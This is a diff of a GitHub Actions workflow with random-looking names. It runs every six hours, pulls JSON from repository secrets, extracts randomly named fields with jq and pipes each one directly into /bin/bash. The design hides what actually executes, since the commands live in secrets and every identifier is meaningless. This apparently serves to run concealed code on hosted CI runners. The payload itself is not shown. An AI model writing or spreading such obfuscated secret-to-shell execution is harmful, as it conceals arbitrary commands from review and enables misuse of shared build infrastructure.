@@ -1,30 +1,25 @@
 name: lujingxi3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
+    - cron: '11 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: lujingxi3456
         env:
-          yu3025: ${{ secrets.yu3025 }}
+          jpneu68: ${{ secrets.jpneu68 }}
         run: |
-          echo $yu3025 | jq -r .jske3843 | /bin/bash
-          echo $y2512 | jq -r .oeon45 | /bin/bash
-          echo $zoata5 | jq -r .qfbj213 | /bin/bash
-          echo $dz328 | jq -r .kb6201 | /bin/bash
-          echo $s96 | jq -r .p2 | /bin/bash
-          echo $y70 | jq -r .fuy4 | /bin/bash
-          echo $ogmq05758 | jq -r .dn08209 | /bin/bash
-          echo $yxh53860 | jq -r .iy084 | /bin/bash
-          echo $yjtq9 | jq -r .g8528 | /bin/bash
-          echo $slc098 | jq -r .hpsxl0671 | /bin/bash
-          echo $wl84 | jq -r .r45 | /bin/bash
-          echo $skmb426 | jq -r .dngb373 | /bin/bash
-          echo $xr04 | jq -r .csroq456 | /bin/bash
-          echo $pwea688 | jq -r .qvxn38 | /bin/bash
-          echo $ff09 | jq -r .xh627 | /bin/bash
+          echo $jpneu68 | jq -r .aqmdw11366 | /bin/bash
+          echo $ag1089 | jq -r .v9 | /bin/bash
+          echo $lnqa474 | jq -r .p07740 | /bin/bash
+          echo $mfitv63 | jq -r .b551 | /bin/bash
+          echo $shvx8732 | jq -r .w94 | /bin/bash
+          echo $f8560 | jq -r .wyvi217 | /bin/bash
+          echo $eny9588 | jq -r .pl2836 | /bin/bash
+          echo $zdbj2 | jq -r .o4037 | /bin/bash
 
